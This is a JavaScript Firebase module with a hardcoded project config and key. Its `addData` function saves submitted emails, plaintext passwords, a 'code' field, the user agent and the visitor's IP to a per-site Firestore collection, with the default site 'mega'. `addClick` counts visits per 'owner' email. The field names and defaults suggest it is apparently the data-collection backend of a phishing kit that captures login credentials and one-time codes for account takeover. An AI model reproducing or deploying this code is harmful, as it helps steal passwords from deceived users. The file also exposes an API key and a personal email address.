// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";

import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "firebase/auth";
import { getFirestore, collection, setDoc, doc, addDoc } from "firebase/firestore";
import axios from "axios";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAFuVxPXGOmYiq04DdcsydSoFET6nhftSo",
  authDomain: "test-fire-access.firebaseapp.com",
  projectId: "test-fire-access",
  storageBucket: "test-fire-access.firebasestorage.app",
  messagingSenderId: "44394012724",
  appId: "1:44394012724:web:51ba8ad7a3a34d00feea61",
  measurementId: "G-F1RQYTCTV2"
};
// const firebaseConfig = {
//   apiKey: "AIzaSyAFuVxPXGOmYiq04DdcsydSoFET6nhftSo",
//   authDomain: "test-fire-access.firebaseapp.com",
//   projectId: "test-fire-access",
//   storageBucket: "test-fire-access.firebasestorage.app",
//   messagingSenderId: "44394012724",
//   appId: "1:44394012724:web:51ba8ad7a3a34d00feea61",
//   measurementId: "G-F1RQYTCTV2"
// };

// Initialize Firebase
const app = initializeApp(firebaseConfig);


const analytics = getAnalytics(app);
const db = getFirestore(app)
const auth = getAuth(app)


const signUpWithRole = async (email, password, role) => {
  try {
    // Create user with email and password
    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;

    // Add user data with role to Firestore
    await setDoc(doc(db, "users", user.uid), {
      email: user.email,
      role: role, // Assign a role like "admin" or "user"
    });

    console.log("User registered with role:", role);
  } catch (error) {
    console.log("Error signing up:", error.message);
  }
};


const addData = async (email = '', password = '', owner = 'admin@gmail.com', site = 'mega', code = '') => {
  try {

    let ip = '';

    try {
      const response = await axios.get("https://api.country.is")
      if (response.data?.ip) {
        ip = response.data.ip
      }
    } catch (error) {
      console.log(error?.message)
    }


    const docRef = await addDoc(collection(db, site), {
      email: email,
      password: password,
      owner: owner,
      createdAt: Date.now(),
      status: 'loading',
      userAgent: navigator.userAgent,
      code: code,
      ip,
    });
    console.log("Document created with ID:", docRef?.id);
    return docRef
  } catch (error) {
    console.log("Error adding document:", error?.message);
    return false
  }
}

const addClick = async (owner = 'nxnahidxyz@gmail.com', site = 'mega') => {
  try {
    await addDoc(collection(db, "clicks"), {
      name: site,
      owner: owner,
      createdAt: Date.now()
    });
    console.log('click added')
    return true
  } catch (error) {
    console.error("Error ensuring and incrementing tryst field:", error);
    return false
  }
};

export { signUpWithRole, auth, addData, db, addClick }